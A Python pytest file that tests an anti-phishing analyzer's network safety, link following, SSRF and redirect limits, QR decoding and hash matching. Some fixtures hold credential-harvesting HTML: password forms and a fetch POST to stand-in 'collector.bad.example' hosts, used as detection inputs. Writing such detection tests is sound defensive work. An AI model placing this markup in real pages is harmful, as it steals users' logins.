from __future__ import annotations

import io
import sqlite3
import urllib.error
from email.message import EmailMessage

import pytest

from antiphish.analyzer import Analyzer
from antiphish.cli import main
from antiphish.config import Limits
from antiphish.kb import SCHEMA
from antiphish.models import Verdict
from antiphish.network import FetchResult, safe_browser_get, safe_http_get


def test_offline_url_never_calls_network(empty_kb, monkeypatch):
    monkeypatch.setattr("antiphish.analyzer.safe_http_get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("network called")))
    monkeypatch.setattr("antiphish.analyzer.safe_browser_get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("network called")))
    report = Analyzer(empty_kb).analyze("https://example.org/login", network="offline")
    assert report.analysis_status.value == "COMPLETE"
    assert report.configuration['static_analysis_status'] == 'COMPLETE'
    assert report.input["network"] == "offline"


def test_offline_file_never_follows_extracted_links(empty_kb, monkeypatch):
    monkeypatch.setattr("antiphish.analyzer.safe_http_get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("network called")))
    report = Analyzer(empty_kb).analyze(b"<a href='https://public.example/page'>Open</a>", name="mail.html", network="offline")
    assert report.analysis_status.value == "COMPLETE"
    assert report.configuration["network_scope"] == "disabled"
    assert report.network_activity == []


def test_http_mode_follows_links_extracted_from_file(empty_kb, monkeypatch):
    calls = []

    def fake_get(url, limits):
        calls.append(url)
        body = b"<form action='https://collector.example/submit'><input type='password'></form><script>fetch('/send')</script>"
        return FetchResult(body=body, final_url="https://public.example/page", chain=["https://public.example/page"], content_type="text/html", status="200")

    monkeypatch.setattr("antiphish.analyzer.safe_http_get", fake_get)
    report = Analyzer(empty_kb).analyze(b"<a href='https://public.example/page'>Open</a>", name="mail.html", network="http")
    assert calls == ["https://public.example/page"]
    assert report.configuration["network_scope"] == "navigation-graph"
    assert report.network_activity[0]["status"] == "FETCHED"
    assert "SENSITIVE_FORM" in {item.code for item in report.reason_codes}


def test_network_candidate_selection_ignores_assets_but_keeps_distinct_paths(empty_kb, monkeypatch):
    calls = []

    def fake_get(url, limits):
        calls.append(url)
        return FetchResult(body=b"<html><body>landing</body></html>", final_url=url, chain=[url], content_type="text/html", status="200")

    monkeypatch.setattr("antiphish.analyzer.safe_http_get", fake_get)
    body = b"""<html><head>
      <link rel='icon' href='https://static-cdn.example/favicon.png'>
      <link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Noto'>
      <script src='https://static-cdn.example/app.js'></script>
      </head><body>
      <img src='https://static-cdn.example/banner.png'>
      <a href='https://www.twitch.tv/r/e/campaign-one'>Open Twitch</a>
      <a href='https://www.twitch.tv/r/e/campaign-two'>Another Twitch link</a>
      <a href='https://account.example.org/check'>Open account</a>
      </body></html>"""
    report = Analyzer(empty_kb).analyze(body, name="newsletter.html", network="http")
    assert calls == ["https://www.twitch.tv/r/e/campaign-one", "https://www.twitch.tv/r/e/campaign-two", "https://account.example.org/check"]
    assert report.configuration["network_urls_total"] == 7
    assert report.configuration["network_candidates"] == 3
    assert report.configuration["network_ignored_resources"] == 4


def test_failed_optional_network_enrichment_does_not_downgrade_static_phishing(empty_kb, monkeypatch):
    def fail_get(url, limits):
        raise TimeoutError("fixture")

    monkeypatch.setattr("antiphish.analyzer.safe_http_get", fail_get)
    body = b"""<form action='https://collector.bad.example/x'><input type='password'></form>
    <script>fetch('https://collector.bad.example/x',{method:'POST'})</script>
    <a href='https://collector.bad.example'>https://portal.example/login</a>"""
    report = Analyzer(empty_kb).analyze(body, name="phish.html", network="http")
    assert report.verdict == Verdict.PHISHING
    assert report.analysis_status.value == "PARTIAL"
    assert report.configuration['static_analysis_status'] == 'COMPLETE'
    assert report.configuration["network_analysis_status"] == "PARTIAL"
    assert report.network_warnings
    assert "ANALYSIS_INCOMPLETE" in {item.code for item in report.reason_codes}


def test_fast_profile_skips_qr_while_quality_decodes_it(empty_kb):
    import cv2

    matrix = cv2.QRCodeEncoder_create().encode("https://qr.bad.example/login")
    matrix = cv2.copyMakeBorder(matrix, 4, 4, 4, 4, cv2.BORDER_CONSTANT, value=255)
    matrix = cv2.resize(matrix, None, fx=8, fy=8, interpolation=cv2.INTER_NEAREST)
    ok, encoded = cv2.imencode(".png", matrix)
    assert ok
    fast = Analyzer(empty_kb).analyze(bytes(encoded), name="code.png", profile="fast")
    quality = Analyzer(empty_kb).analyze(bytes(encoded), name="code.png", profile="quality")
    assert not fast.urls
    assert quality.urls[0].host == "qr.bad.example"
    assert fast.configuration["profile"] == "fast"
    assert "embedded-image-and-qr-analysis" in quality.configuration["stages"]


def test_http_rejects_private_target(monkeypatch):
    monkeypatch.setattr("antiphish.network.is_public_host", lambda host: (False, ["127.0.0.1"]))
    with pytest.raises(ValueError, match="SSRF"):
        safe_http_get("http://127.0.0.1/", Limits())


def test_browser_requires_literal_confirmation():
    with pytest.raises(ValueError, match="requires"):
        safe_browser_get("https://example.org/", Limits(), None)


def test_redirect_loop_stops_at_limit(monkeypatch):
    class LoopOpener:
        def open(self, request, timeout=None):
            headers = {"Location": request.full_url}
            raise urllib.error.HTTPError(request.full_url, 302, "loop", headers, None)

    monkeypatch.setattr("antiphish.network.is_public_host", lambda host: (True, ["93.184.216.34"]))
    monkeypatch.setattr("antiphish.network.urllib.request.build_opener", lambda *a, **k: LoopOpener())
    with pytest.raises(ValueError, match="redirect limit"):
        safe_http_get("https://example.org/", Limits(max_redirects=2))


def test_cli_exit_codes_and_schema(tmp_path, empty_kb, capsys):
    benign = tmp_path / "benign.eml"
    benign.write_bytes(b"From: a@corp.ru\nTo: b@corp.ru\nSubject: Meeting\n\nHello")
    assert main(["analyze", str(benign), "--kb", str(empty_kb), "--json"]) == 0
    output = capsys.readouterr().out
    assert '"schema_version": "2.0"' in output
    assert main(["analyze", str(tmp_path / "missing.eml"), "--kb", str(empty_kb)]) == 30


def test_confirmed_attachment_hash_blocks_message(empty_kb):
    payload = b"known malicious attachment fixture"
    import hashlib
    digest = hashlib.sha256(payload).hexdigest()
    con = sqlite3.connect(empty_kb)
    try:
        con.execute("INSERT INTO known_hashes VALUES(?,?,?,?,?,?,?)", (digest, "binary", "PHISHING", "unit-test", None, None, "confirmed"))
        con.commit()
    finally:
        con.close()
    message = EmailMessage()
    message["From"] = "a@corp.ru"
    message["To"] = "b@corp.ru"
    message["Subject"] = "file"
    message.set_content("attached")
    message.add_attachment(payload, maintype="application", subtype="octet-stream", filename="report.bin")
    report = Analyzer(empty_kb).analyze(message.as_bytes(), name="mail.eml")
    assert report.verdict == Verdict.PHISHING
    assert any(e.details.get("attachment") == "report.bin" for e in report.reason_codes if e.code == "IOC_SHA256_MATCH")
